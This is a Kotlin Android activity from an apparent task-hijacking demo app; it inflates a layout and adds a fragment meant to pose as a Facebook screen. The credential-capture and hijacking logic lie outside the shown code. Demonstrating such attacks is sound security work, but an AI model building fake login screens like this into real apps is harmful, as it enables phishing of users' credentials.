package com.minhhnn.forsaken.androidtaskhijackingdemo

import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import androidx.fragment.app.add
import androidx.fragment.app.commit
import com.minhhnn.forsaken.androidtaskhijackingdemo.databinding.ActivityMainBinding
import com.minhhnn.forsaken.androidtaskhijackingdemo.databinding.ActivityPhishingFacebookBinding

class PhishingFacebookActivity : AppCompatActivity() {

    private lateinit var binding : ActivityPhishingFacebookBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityPhishingFacebookBinding.inflate(layoutInflater)
        setContentView(binding.root)
    }

    override fun onResume() {
        super.onResume()
    }

     fun inflatePhishingFragment(){
        supportFragmentManager.commit {
            setReorderingAllowed(true)
            add<PhishingFacebookFragment>(R.id.fragment_container_view)
        }
    }
}